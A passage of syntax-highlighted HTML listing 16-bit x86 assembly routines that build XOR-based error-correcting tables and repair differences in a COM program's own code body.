        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">ecc_returnpoint</span><span class="sc0"> </span><span class="sc1">; cx=0 means body is ok, otherwise</span><span class="sc0">
                    </span><span class="sc1">; body has to be corrected</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; nr info bits</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ecc data segment that keeps changes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; check data segment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; where begins checking on code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_correct_diffs</span><span class="sc0">

</span><span class="sc5">ecc_returnpoint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">0Ah</span><span class="sc0">


</span><span class="sc5">ecc_create_table_second</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">arg_0</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">arg_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">arg_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">ecc_findmsb_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; lenght</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ecc_findmsb_end_2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; find msb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ecc_findmsb_2</span><span class="sc0">

</span><span class="sc5">ecc_findmsb_end_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; end lenght?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ecc_finish_calc_2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AX:0 has code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; + seg current chunk</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">         </span><span class="sc1">; - 100h for com exec - 10h</span><span class="sc0">
                        </span><span class="sc1">; to get begin of chunk</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">ecc_finish_calc_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; signal last loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">



</span><span class="sc5">ecc_create_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">var_10</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">var_E</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">0Eh</span><span class="sc0">
</span><span class="sc5">var_C</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">var_A</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">var_8</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">var_6</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">var_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">var_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">arg_0</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">arg_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">arg_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">

</span><span class="sc5">ecc_findmsb_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; lenght</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ecc_findmsb_end_1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; find position of msb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ecc_findmsb_1</span><span class="sc0">

</span><span class="sc5">ecc_findmsb_end_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_10</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">          </span><span class="sc1">; clear part of stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; lenght</span><span class="sc0">

</span><span class="sc5">ecc_loopcalc_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ecc_finish_calc_1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; lenght</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_create_table_second</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ecc_loopcalc_pre_end_1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; create on local var storage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_E</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_A</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0Eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">ecc_finish_calc_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ecc_loopcalc_1</span><span class="sc0">

</span><span class="sc5">ecc_loopcalc_pre_end_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">var_10</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; copy the generated data</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; all the parts done?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ecc_loopcalc_end_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ecc_findmsb_end_1</span><span class="sc0">

</span><span class="sc1">; from es:0 all the generated stuff</span><span class="sc0">
</span><span class="sc5">ecc_loopcalc_end_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">


</span><span class="sc5">ecc_compute_diffs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">arg_0</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">arg_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">arg_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc5">ecc_calc_diff_next_chunk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; data segment calcualted at</span><span class="sc0">
                        </span><span class="sc1">; compilation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; calculated before</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">ecc_calc_diff_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; compute differences</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ecc_calc_diff_loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; next 10h chunk</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; next 10h chunk</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; how many left</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ecc_calc_diff_next_chunk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">


</span><span class="sc5">ecc_correct_diffs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">arg_0</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">arg_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">arg_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">arg_6</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; from first bit</span><span class="sc0">

</span><span class="sc5">ecc_correct_nextbit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">ecc_correct_nextseg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_6</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; on ecc data</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; + part we are checking</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">ecc_correct_countloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; count differences and put</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; in cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">ecc_correct_countloop</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ecc_correct_bytechain_ok</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; else let's try to correct</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_create_table_second</span><span class="sc0"> </span><span class="sc1">; get the correction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
